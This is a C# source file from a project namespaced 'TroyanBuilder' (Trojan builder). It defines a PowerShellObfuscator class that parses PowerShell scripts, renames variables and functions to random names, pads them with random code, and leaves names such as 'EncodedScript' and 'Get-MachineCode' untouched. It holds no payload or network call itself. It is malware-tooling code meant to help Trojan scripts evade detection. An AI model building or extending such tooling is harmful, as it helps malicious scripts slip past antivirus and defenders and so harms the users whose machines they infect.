using System.Management.Automation.Language;
using System.Text;
using System.Text.RegularExpressions;

namespace TroyanBuilder
{
    public partial class PowerShellObfuscator
    {
        private  readonly Dictionary<string,Dictionary<string, string>> RenamedVar = new();

        public void ObfuscateFile(string psScriptFile)
        {
            var data  = File.ReadAllText(psScriptFile);
            data = Obfuscate(data);
            data = RandomCode() + data + RandomCode();
            File.WriteAllText(psScriptFile, data);
        }

        public string Obfuscate(string psScript)
        {
            var parsed = Parse(psScript);
            
            FindAndRenameFunctions(parsed, "general");
            psScript = Obfuscate(parsed);
            parsed = Parse(psScript);

            FindAndRenameVariables(parsed, "general", false);
            psScript = Obfuscate(parsed);
            parsed = Parse(psScript);
            
            
            ObfuscateFunctions(parsed, "general");
            psScript = Obfuscate(parsed);
            parsed = Parse(psScript);
            
     
            return psScript;
        }

        public class Parsed
        {
            public string PsScript {get; set;}
            public ScriptBlockAst Body { get; set; }
            public Token[] Tokens { get; set; }
            
            public ParseError[] Errors { get; set; }
        }

        private  Parsed Parse(string psScript)
        {
            var body = Parser.ParseInput(psScript, out Token[] tokens, out ParseError[] errors);
            if (errors.Length > 0)
                throw new Exception("PowerShell script contains syntax errors!");
            return new Parsed() {Body = body, Tokens = tokens, Errors = errors, PsScript = psScript };
        }
        
        static List<string> ExtractVariableNames(string input)
        {
            var matches = Regex.Matches(input, @"\$(\w+)");
            return matches.Select(m => m.Groups[1].Value).Distinct().ToList();
        }

        private  string Obfuscate(Parsed parsed)
        {
            var inScope = false;
            var scope = "general";
            var level = 0;
            var sb = new StringBuilder(parsed.PsScript.Length);
            int lastPos = 0;
            foreach (var token in parsed.Tokens)
            {
                if (token.Extent.StartOffset > lastPos && lastPos >= 0 && token.Extent.StartOffset <= parsed.PsScript.Length)
                {
                    var q = parsed.PsScript.AsSpan(lastPos, token.Extent.StartOffset - lastPos);
                    sb.Append(q);
                }

                if (token.Kind == TokenKind.Function)
                {
                    inScope = true;
         
                }
                else if (token.Kind == TokenKind.Identifier)
                {
                    if (inScope && level == 0)
                    {
                        scope = token.Text;
                    }
                }
                else if (token.Kind == TokenKind.LCurly)
                {
                    if (inScope)
                    {
                        level += 1;
                    }
                }
                else if (token.Kind == TokenKind.RCurly)
                {
                    if (inScope)
                    {
                        level -= 1;
                        if (level == 0)
                        {
                            inScope = false;
                            scope = "general";
                        }
                    }
                }
                
                if (token.Kind == TokenKind.Identifier || token.Kind == TokenKind.Generic || token.Kind == TokenKind.Variable || token.Kind == TokenKind.StringExpandable)
                {
                    string tokenText = token.Text;
                    if (token.Kind == TokenKind.StringExpandable)
                    {
                        var variableNames = ExtractVariableNames(tokenText);
                        foreach (var variableName in variableNames)
                        {
                            if (TryGetRenamedVar(scope, variableName, out var renamedVar))
                            {
                                tokenText = tokenText.Replace(variableName, renamedVar);
                            }
                        }
                        sb.Append(tokenText);
                    }
                    else if (token.Kind == TokenKind.Variable)
                    {
                        string variableName = tokenText.TrimStart('$');
                        if (TryGetRenamedVar(scope, variableName, out var renamedVar))
                        {
                            sb.Append('$' + renamedVar);
                        }
                        else
                        {
                            sb.Append(tokenText);
                        }
                    }
                    else if (token.Kind == TokenKind.Identifier && inScope)
                    {
                        string tokenName = tokenText;
                        if (TryGetRenamedFunc(tokenName, out var renamedVar))
                        {
                            sb.Append(renamedVar);
                        }
                        else
                        {
                            sb.Append(tokenText);
                        }
                    }
                    else if (token.Kind == TokenKind.Identifier || token.Kind == TokenKind.Generic)
                    {
                        string tokenName = tokenText;
                        if (TryGetRenamedVar(scope, tokenName, out var renamedVar))
                        {
                            sb.Append(renamedVar);
                        }
                        else if (TryGetRenamedFunc(tokenName, out var renamedFunc))
                        {
                            sb.Append(renamedFunc);
                        }
                        else
                        {
                            sb.Append(tokenText);
                        }
                    }
                    else
                    {
                        sb.Append(tokenText);
                    }
                }
                else
                {
                    sb.Append(token.Text);
                }

                lastPos = token.Extent.EndOffset;
            }

            if (lastPos >= 0 && lastPos < parsed.PsScript.Length)
            {
                sb.Append(parsed.PsScript.AsSpan(lastPos));
            }

            return sb.ToString();
        }

        public class VarInfo
        {
            public string Name { get; set; }
            public bool IsParameter { get; set; }
            public bool isFunction { get; set; }
            public string Scope { get; set; }
        }

        private  List<string> Exclusions = new List<string>()
        {
            "true", "false","Get-MachineCode","EncodedScript"
        };

        private  VarInfo GetInfo(VariableExpressionAst variable, string scope)
        {
            var result = new VarInfo();
            result.Scope = scope;
            string variableName = variable.VariablePath.UserPath;
            result.Name = variableName.TrimStart('$');
            if (Exclusions.Select(a=> a.ToLower()).Contains(variableName.ToLower()))
                result.IsParameter = true;
            
            var parent = variable.Parent;
            while (parent != null)
            {
                if (parent is ParamBlockAst)
                {
                    result.IsParameter = true;
                }
                if (parent is FunctionDefinitionAst)
                {
                    result.isFunction = true;
                    result.Scope = ((FunctionDefinitionAst)parent).Name;
                }
                parent = parent.Parent;
            }
            return result;
        }


        private  void FindAndRenameVariables(Parsed parsed, string scope, bool nested)
        {
            var vars = parsed.Body.FindAll(x => x is VariableExpressionAst, nested).Cast<VariableExpressionAst>();
            foreach (var variableAst in vars )
            {
                var info = GetInfo(variableAst, scope);
      
    
                var newname = info.IsParameter ? info.Name : GenerateRandomName();
                AddRenamedVar(info.Scope, info.Name, newname);
            }
        }
        
     
        private void AddRenamedVar(string scope, string name, string newName)
        {
            if (scope != "general")
            {
                bool exists = TryGetRenamedVar("general", name, out var globalVar);
                if (exists)
                {
                    RenamedVar.TryAdd(scope, new Dictionary<string, string>());
                    RenamedVar[scope].TryAdd(name, globalVar);
                    return;
                }
            }

            RenamedVar.TryAdd(scope, new Dictionary<string, string>());
            RenamedVar[scope].TryAdd(name, newName);
        }
        
        private bool TryGetRenamedVar(string scope, string name, out string newName)
        {
            newName = name;
            var got = RenamedVar.TryGetValue(scope, out var dict);
            if (!got)
                return false;
            got = dict!.TryGetValue(name, out var x);
            if (!got)
                return false;
            newName = x;
            return true;
        }
        
    }
}
